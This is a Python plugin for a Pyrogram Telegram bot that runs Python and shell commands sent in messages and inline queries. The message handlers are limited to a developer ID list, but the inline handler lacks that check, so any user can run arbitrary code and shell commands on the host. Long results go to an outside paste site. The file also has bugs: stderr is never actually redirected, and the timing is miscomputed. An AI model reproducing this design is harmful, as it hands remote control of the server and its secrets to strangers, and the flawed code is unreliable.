import io
import sys
import traceback
import subprocess
from datetime import datetime
from pyrogram import Client
from pyrogram.enums import ParseMode
from pyrogram.types import (
    InlineQuery,
    InlineQueryResultArticle,
    InputTextMessageContent,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    Message,
)
from contextlib import redirect_stdout
from subprocess import getoutput as run
import requests

DEV_LIST = [6312693124, 5443243540, 1238234357, 6141343858]

async def aexec(code, client, message):
    exec(
        "async def __aexec(client, message): "
        + "".join(f"\n {l_}" for l_ in code.split("\n"))
    )
    return await locals()["__aexec"](client, message)

async def spacebin(text: str):
    url = "https://spaceb.in/api/v1/documents/"
    response = requests.post(url, data={"content": text, "extension": "txt"})
    id = response.json().get("payload").get("id")
    link = f"https://spaceb.in/{id}"
    return link

@Client.on_message()
async def eval_command(client: Client, m: Message):
    if m.from_user.id not in DEV_LIST:
        await m.reply_text("`You Don't Have Enough Rights To Run This!`")
        return
    if len(m.text.split()) < 2:
        await m.reply_text("`Input Not Found!`")
        return
    cmd = m.text.split(None, 1)[1]
    start = datetime.now()
    reply_to_ = m.reply_to_message or m
    redirected_output = io.StringIO()
    redirected_error = io.StringIO()
    stdout, stderr, exc = None, None, None

    try:
        with redirect_stdout(redirected_output), redirect_stdout(redirected_error):
            await aexec(cmd, client, m)
    except Exception:
        exc = traceback.format_exc()

    stdout = redirected_output.getvalue()
    stderr = redirected_error.getvalue()
    evaluation = exc or stderr or stdout or "Success"
    end = datetime.now()
    ping = (end - start).microseconds / 1000
    final_output = (
        f"<b>📎 Input:</b> <code>{cmd}</code>\n\n"
        f"<b>📒 Output:</b>\n<code>{evaluation.strip()}</code>\n\n"
        f"<b>✨ Taken Time:</b> {ping}ms"
    )
    if len(final_output) > 4096:
        link = await spacebin(final_output)
        await reply_to_.reply_text(f"Result too long: [View Here]({link})", disable_web_page_preview=True)
    else:
        await m.reply_text(final_output, parse_mode=ParseMode.HTML)

@Client.on_message()
async def sh_command(client: Client, m: Message):
    if m.from_user.id not in DEV_LIST:
        await m.reply_text("`You Don't Have Enough Rights To Run This!`")
        return
    if len(m.text.split()) < 2:
        await m.reply_text("`No Input Found!`")
        return
    cmd = m.text.split(None, 1)[1]
    result = run(cmd)
    output = f"**📎 Input:** `{cmd}`\n\n**📒 Output:**\n`{result}`"
    if len(output) > 4096:
        link = await spacebin(output)
        await m.reply_text(f"Result too long: [View Here]({link})", disable_web_page_preview=True)
    else:
        await m.reply_text(output)

@Client.on_inline_query()
async def handle_inline(client: Client, inline_query: InlineQuery):
    query = inline_query.query
    if query.startswith("py "):
        code = query[3:].strip()
        if not code:
            await inline_query.answer(
                results=[
                    InlineQueryResultArticle(
                        title="Provide Code",
                        description="Please provide code to execute.",
                        input_message_content=InputTextMessageContent("Usage: py <code>"),
                    )
                ],
                is_personal=True,
                cache_time=0,
            )
            return
        start = datetime.now()
        redirected_output = io.StringIO()
        redirected_error = io.StringIO()
        stdout, stderr, exc = None, None, None
        try:
            with redirect_stdout(redirected_output), redirect_stdout(redirected_error):
                await aexec(code, client, inline_query)
        except Exception:
            exc = traceback.format_exc()

        stdout = redirected_output.getvalue()
        stderr = redirected_error.getvalue()
        evaluation = exc or stderr or stdout or "Success"
        end = datetime.now()
        ping = (end - start).microseconds / 1000
        if len(evaluation) > 4096:
            link = await spacebin(evaluation)
            result = InlineQueryResultArticle(
                title="Result Too Long",
                description="Click to view full result.",
                input_message_content=InputTextMessageContent(f"[View Result Here]({link})"),
            )
        else:
            result = InlineQueryResultArticle(
                title="Execution Result",
                description=f"Executed in {ping} ms",
                input_message_content=InputTextMessageContent(
                    f"<b>📎 Input:</b> <code>{code}</code>\n\n"
                    f"<b>📒 Output:</b>\n<code>{evaluation.strip()}</code>\n\n"
                    f"<b>✨ Taken Time:</b> {ping}ms",
                    parse_mode=ParseMode.HTML,
                ),
            )
        await inline_query.answer(results=[result], is_personal=True, cache_time=0)

    elif query.startswith("sh "):
        command = query[3:].strip()
        if not command:
            await inline_query.answer(
                results=[
                    InlineQueryResultArticle(
                        title="Provide Command",
                        description="Please provide a shell command to execute.",
                        input_message_content=InputTextMessageContent("Usage: sh <command>"),
                    )
                ],
                is_personal=True,
                cache_time=0,
            )
            return
        start = datetime.now()
        result = run(command)
        end = datetime.now()
        ping = (end - start).microseconds / 1000
        if len(result) > 4096:
            link = await spacebin(result)
            inline_result = InlineQueryResultArticle(
                title="Result Too Long",
                description="Click to view full result.",
                input_message_content=InputTextMessageContent(f"[View Result Here]({link})"),
            )
        else:
            inline_result = InlineQueryResultArticle(
                title="Execution Result",
                description=f"Executed in {ping} ms",
                input_message_content=InputTextMessageContent(
                    f"<b>📎 Command:</b> <code>{command}</code>\n\n"
                    f"<b>📒 Output:</b>\n<code>{result.strip()}</code>\n\n"
                    f"<b>✨ Taken Time:</b> {ping}ms",
                    parse_mode=ParseMode.HTML,
                ),
            )
        await inline_query.answer(results=[inline_result], is_personal=True, cache_time=0)


__HELP__ = "HI"
__MODULE__ = "BYE"
